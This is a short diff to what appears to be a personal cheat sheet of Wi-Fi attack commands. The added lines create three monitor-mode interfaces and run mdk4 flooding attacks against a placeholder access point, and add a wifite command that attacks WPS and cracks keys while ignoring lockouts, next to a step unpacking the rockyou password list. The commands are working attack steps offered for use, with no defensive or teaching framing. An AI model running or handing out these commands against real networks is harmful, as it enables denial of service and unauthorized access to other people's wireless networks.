@@ -150,6 +150,18 @@
  # mdk4  
     sudo apt install mdk4
     
+    ifconfig wlan1 down
+    iw phy1 interface add mon0 type monitor
+    iw phy1 interface add mon1 type monitor
+    iw phy1 interface add mon2 type monitor
+    iw wlan1 del
+    ifconfig mon0 up
+    ifconfig mon1 up
+    ifconfig mon2 up
+    mdk4 mon0 e -t [TARGET] -s 100
+    mdk4 mon1 e -t [TARGET] -s 100
+    mdk4 mon2 e -t [TARGET] -s 100
+    
  # wpa supplicant
     vi /etc/wpa_supplicant.conf
         
@@ -162,3 +174,7 @@
     
  # Wordlists
     sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+    
+ # wifite
+    wifite --wps --ignore-locks --crack
+    
